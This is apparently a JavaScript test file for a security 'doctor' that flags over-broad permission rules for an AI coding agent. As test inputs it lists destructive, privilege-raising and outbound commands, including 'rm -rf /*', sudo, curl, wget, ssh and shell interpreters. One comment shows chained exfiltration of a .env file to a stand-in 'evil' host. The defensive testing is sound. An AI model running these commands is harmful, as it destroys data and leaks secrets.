import test from 'node:test';
import assert from 'node:assert/strict';
import { statuslineConfigDiagnostic, statuslineBridgeDiagnostic, hooksBridgeDiagnostic, classifyPermissionRule, summarizeDangerous, classifyAuthToken, computeReadiness, classifyDeviceGateTopology, modelSettingsConflictDiagnostic } from '../../src/ops/doctor-checks.js';

test('modelSettingsConflictDiagnostic: local 已写 model → ok', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'claude-fable-5[1m]',
    localModel: 'grok-4.5',
    defaultEnvTargets: ['grok-4.5'],
  });
  assert.equal(r.status, 'ok');
  assert.match(r.detail, /local/);
});

test('modelSettingsConflictDiagnostic: 全局 model 与 DEFAULT 映射不一致且 local 无 model → warn', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'claude-fable-5[1m]',
    localModel: '',
    projectModel: '',
    defaultEnvTargets: ['grok-4.5', 'grok-4.5'],
  });
  assert.equal(r.status, 'warn');
  assert.match(r.detail, /claude-fable-5/);
  assert.match(r.detail, /grok-4\.5/);
  assert.match(r.detail, /settings\.local\.json/);
});

test('modelSettingsConflictDiagnostic: 全局 model 已是映射目标 → ok', () => {
  const r = modelSettingsConflictDiagnostic({
    userModel: 'grok-4.5',
    defaultEnvTargets: ['grok-4.5'],
  });
  assert.equal(r.status, 'ok');
});

test('modelSettingsConflictDiagnostic: 无 DEFAULT 映射 → ok（无冲突信号）', () => {
  assert.equal(modelSettingsConflictDiagnostic({ userModel: 'claude-fable-5[1m]' }).status, 'ok');
  assert.equal(modelSettingsConflictDiagnostic({}).status, 'ok');
});

test('statuslineConfigDiagnostic treats web statusline as self-contained', () => {
  const result = statuslineConfigDiagnostic();

  assert.equal(result.status, 'ok');
  assert.match(result.detail, /SDK/);
  assert.doesNotMatch(result.detail, /settings\.json/);
  assert.doesNotMatch(result.detail, /E16.*禁用/);
});

test('statuslineConfigDiagnostic：实际读取 off 状态，不再是恒定装饰性检查（code-review P2）', () => {
  const enabled = statuslineConfigDiagnostic(false);
  assert.equal(enabled.status, 'ok');
  assert.match(enabled.detail, /SDK/); // 与默认调用一致：启用态

  const off = statuslineConfigDiagnostic(true);
  assert.equal(off.status, 'ok'); // WEB_STATUSLINE=off 是合法配置，不是风险，仍 ok
  assert.match(off.detail, /已.*关闭|off/i);
  assert.notEqual(off.detail, enabled.detail, '开/关两态的 detail 文案应不同，证明确实读取了状态');
});

test('statuslineBridgeDiagnostic：区分已安装、未安装与用户改写后的 drift', () => {
  assert.equal(statuslineBridgeDiagnostic({ installState: 'installed' }).status, 'ok');
  assert.match(statuslineBridgeDiagnostic({ installState: 'installed' }).detail, /CLI.*同步/);
  assert.equal(statuslineBridgeDiagnostic({ installState: 'not-installed' }).status, 'warn');
  assert.match(statuslineBridgeDiagnostic({ installState: 'not-installed' }).detail, /statusline:install/);
  assert.equal(statuslineBridgeDiagnostic({ installState: 'drifted' }).status, 'warn');
  assert.match(statuslineBridgeDiagnostic({ installState: 'drifted' }).detail, /改写|漂移/);
  assert.equal(statuslineBridgeDiagnostic({ webOff: true, installState: 'not-installed' }).status, 'ok');
  assert.equal(statuslineBridgeDiagnostic({ bridgeOff: true, installState: 'not-installed' }).status, 'ok');
});

// ④ 安全体检核心：危险白名单判定 —— 公网暴露前审查 permissions.allow 里哪些规则过宽。
test.describe('classifyPermissionRule：危险规则判定', () => {
  const sev = r => classifyPermissionRule(r).severity;
  test('无限定 Bash → danger（等于放开 shell）', () => {
    assert.equal(sev('Bash'), 'danger');
    assert.equal(sev('Bash(*)'), 'danger');
    assert.equal(sev('Bash(:*)'), 'danger');
  });
  test('破坏性 / 提权命令 → danger', () => {
    assert.equal(sev('Bash(sudo apt*)'), 'danger');
    assert.equal(sev('Bash(rm -rf /*)'), 'danger');
    assert.equal(sev('Bash(chmod 777*)'), 'danger');
  });
  test('外联 / 外泄命令 → danger', () => {
    assert.equal(sev('Bash(curl*)'), 'danger');
    assert.equal(sev('Bash(wget http*)'), 'danger');
    assert.equal(sev('Bash(ssh*)'), 'danger');
  });
  test('裸写类工具（无路径限定）→ danger', () => {
    assert.equal(sev('Write'), 'danger');
    assert.equal(sev('Edit'), 'danger');
    assert.equal(sev('MultiEdit'), 'danger');
  });
  test('窄限定 → ok', () => {
    assert.equal(sev('Bash(npm run test:*)'), 'ok');
    assert.equal(sev('Write(//repo/**)'), 'ok');
    assert.equal(sev('Read(//repo/src/**)'), 'ok');
  });
  test('宽通配 / 读全盘 / 外部抓取 → warn', () => {
    assert.equal(sev('Read'), 'warn');
    assert.equal(sev('WebFetch'), 'warn');
    assert.equal(sev('Bash(git*)'), 'warn');
  });
  // 假阴性：命令名边界此前只认空白/行尾（`rm(\s|$)`、`dd\s`），而 Claude Code 的规范通配语法是
  // `Bash(rm:*)` —— 命令名后面跟的是冒号，两条都不匹配 → 降级成 warn。同一条正则里 sudo/chmod/curl
  // 是纯前缀匹配所以判对了，规则内部不自洽。体检把「关键项就绪」写在这上面，漏判即假绿。
  test('规范通配语法 Bash(cmd:*) 的命令名边界须被识别', () => {
    assert.equal(sev('Bash(rm:*)'), 'danger');
    assert.equal(sev('Bash(dd:*)'), 'danger');
    assert.equal(sev('Bash(chown:*)'), 'danger');
  });
  // sh/bash/eval 等解释器在语义上与 Bash(*) 完全等价（都能执行任意命令），而 Bash(*) 判 danger。
  test('shell 解释器等价于放开 shell → danger', () => {
    for (const c of ['sh', 'bash', 'zsh', 'eval', 'exec', 'source']) {
      assert.equal(sev(`Bash(${c}:*)`), 'danger', `Bash(${c}:*) 应判 danger`);
    }
  });
  // 只取第一个 token 判定 → `npm run build && curl http://evil/$(cat .env)` 被判「ok 限定命令」。
  test('链式 / 命令替换：每一段都要判，不能只看第一个 token', () => {
    assert.equal(sev('Bash(npm run build && curl http://evil/)'), 'danger');
    assert.equal(sev('Bash(echo hi; sudo reboot)'), 'danger');
    assert.equal(sev('Bash(ls | ssh host)'), 'danger');
  });
  test('分段判定不得误伤既有窄限定', () => {
    assert.equal(sev('Bash(npm run test:*)'), 'ok');
    assert.equal(sev('Bash(git status)'), 'ok');
    assert.equal(sev('Bash(git log --oneline | head)'), 'ok');
  });
  test('相对父目录递归通配 Read(../**) → warn，不应被漏判为 ok（code-review P2）', () => {
    assert.equal(sev('Read(../**)'), 'warn');
    assert.equal(sev('Read(../../**)'), 'warn');
  });
  // OPS-1：Write/Edit 的 ** / ~/** / /** 与 Read 同属「宽路径」，不得被当成「限定路径的写」→ ok。
  // 此前 wildcard 只认 null/''/'*' /':*'，Write(**) 走 ok 分支 → doctor readiness 可假绿。
  test('宽路径 Write/Edit(**|~/**|/**) → danger，不得误判 ok（OPS-1）', () => {
    assert.equal(sev('Write(**)'), 'danger');
    assert.equal(sev('Write(~/**)'), 'danger');
    assert.equal(sev('Write(/**)'), 'danger');
    assert.equal(sev('Edit(**)'), 'danger');
    assert.equal(sev('MultiEdit(**)'), 'danger');
    assert.equal(sev('NotebookEdit(~/**)'), 'danger');
    assert.equal(sev('Write(../**)'), 'danger');
    // 真正窄路径仍 ok（与既有 Write(//repo/**) 一致）
    assert.equal(sev('Write(//repo/**)'), 'ok');
  });
  test('未知工具 / mcp 不误报 danger', () => {
    assert.equal(sev('mcp__server__tool'), 'ok');
    assert.notEqual(sev('SomeWeirdTool'), 'danger');
  });
  test('每条带 reason，且空/垃圾输入不抛', () => {
    assert.match(classifyPermissionRule('Bash(*)').reason, /.+/);
    assert.doesNotThrow(() => classifyPermissionRule(''));
    assert.doesNotThrow(() => classifyPermissionRule(null));
  });
});

test.describe('summarizeDangerous', () => {
  test('混合规则 → ruleCount 全量 + dangerous 仅危险条（带 rule/reason）', () => {
    const s = summarizeDangerous(['Bash(*)', 'Read', 'Write(//r/**)', 'Bash(curl*)']);
    assert.equal(s.ruleCount, 4);
    assert.equal(s.dangerous.length, 2);
    assert.ok(s.dangerous.every(d => d.rule && d.reason));
  });
  test('空白名单 → ruleCount 0, dangerous []', () => {
    assert.deepEqual(summarizeDangerous([]), { ruleCount: 0, dangerous: [] });
  });
});

test.describe('classifyAuthToken：绝不回显明文', () => {
  test('undefined → warn(isSet false)', () => {
    assert.deepEqual(classifyAuthToken(undefined), { status: 'warn', isSet: false });
  });
  test('空串 → fail', () => {
    assert.equal(classifyAuthToken('').status, 'fail');
  });
  test('短 token → warn，返回 length 但无明文', () => {
    const r = classifyAuthToken('abc');
    assert.equal(r.status, 'warn');
    assert.equal(r.length, 3);
    assert.equal(JSON.stringify(r).includes('abc'), false);
  });
  test('正常 token → ok，不回显明文', () => {
    const r = classifyAuthToken('x'.repeat(32));
    assert.equal(r.status, 'ok');
    assert.equal(JSON.stringify(r).includes('x'.repeat(32)), false);
  });
});

test.describe('computeReadiness：公网暴露就绪度', () => {
  const chk = (id, status, safe) => ({ id, status, safe });
  test('任一 fail → blocked', () => {
    assert.equal(computeReadiness([chk('CLAUDE_BIN', 'fail')]).level, 'blocked');
  });
  test('危险白名单 + 无 CF + 弱 token → blocked', () => {
    assert.equal(computeReadiness([
      chk('AUTH_TOKEN', 'warn'), chk('CF_ACCESS', 'ok', { enabled: false }),
      chk('WHITELIST', 'warn', { dangerous: [{ rule: 'Bash(*)' }] }),
    ]).level, 'blocked');
  });
  test('危险白名单 + 有 CF Access → caution（有兜底）', () => {
    assert.equal(computeReadiness([
      chk('AUTH_TOKEN', 'ok'), chk('CF_ACCESS', 'ok', { enabled: true }),
      chk('WHITELIST', 'warn', { dangerous: [{ rule: 'Bash(*)' }] }),
    ]).level, 'caution');
  });
  test('全净 → ready', () => {
    assert.equal(computeReadiness([chk('AUTH_TOKEN', 'ok'), chk('WHITELIST', 'ok', { dangerous: [] })]).level, 'ready');
  });
});

test.describe('classifyDeviceGateTopology（AUTH-003）', () => {
  test('CF Access 已开 → ok（设备门 bypass 为设计路径）', () => {
    const r = classifyDeviceGateTopology({ authTokenSet: true, cfEnabled: true });
    assert.equal(r.status, 'ok');
    assert.equal(r.safe.risk, 'none');
  });
  test('有 AUTH_TOKEN 无 CF Access → ok（Host 感知设备门，A2 不再误报 tunnel 跳过）', () => {
    const r = classifyDeviceGateTopology({ authTokenSet: true, cfEnabled: false });
    assert.equal(r.status, 'ok');
    assert.equal(r.safe.risk, 'none');
    assert.equal(r.safe.note, 'host_aware_device_gate');
    assert.match(r.detail, /设备门|CF Access/);
  });
  test('无 AUTH_TOKEN → ok（仅本机）', () => {
    const r = classifyDeviceGateTopology({ authTokenSet: false, cfEnabled: false });
    assert.equal(r.status, 'ok');
  });
});

// D12：hooks 桥安装态四分支。与 D6 同款——drifted 不自作主张覆盖，只提示用户自己看。
test('hooksBridgeDiagnostic：off / 已安装 / 漂移 / 未安装 四态', () => {
  assert.equal(hooksBridgeDiagnostic({ bridgeOff: true }).status, 'ok');
  assert.equal(hooksBridgeDiagnostic({ installState: 'installed' }).status, 'ok');
  const drifted = hooksBridgeDiagnostic({ installState: 'drifted' });
  assert.equal(drifted.status, 'warn');
  assert.match(drifted.detail, /勿强行覆盖/);
  const missing = hooksBridgeDiagnostic({ installState: 'not-installed' });
  assert.equal(missing.status, 'warn');
  assert.match(missing.detail, /hooks:install/);
});
